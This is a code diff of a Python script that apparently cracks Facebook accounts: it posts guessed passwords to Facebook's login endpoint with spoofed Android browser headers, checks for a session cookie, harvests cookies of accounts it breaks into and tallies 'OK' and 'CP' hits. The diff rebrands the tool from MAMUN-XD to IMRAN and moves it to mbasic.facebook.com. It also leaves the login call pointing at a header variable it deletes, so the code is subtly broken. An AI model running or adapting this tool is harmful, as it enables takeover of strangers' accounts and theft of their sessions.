@@ -54,7 +54,7 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    os.system('python MAMUN-XD.py')
+    os.system('python IMRAN.py')
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
@@ -441,23 +441,27 @@ def freeq(uid,pwx,tl):
             "flow":"login_no_pain",
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'm.facebook.com',
-            "method": 'GET',
-            "path": '/?tbua=1',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            "referer": 'https://m.facebook.com/',
-            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": '"Android"',
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro,}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            headers = {
+    'authority': 'mbasic.facebook.com',
+    "method": 'GET',
+    "path": '/?tbua=1',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -476,7 +480,7 @@ def freeq(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mMAMUN-XD\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mIMRAN\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
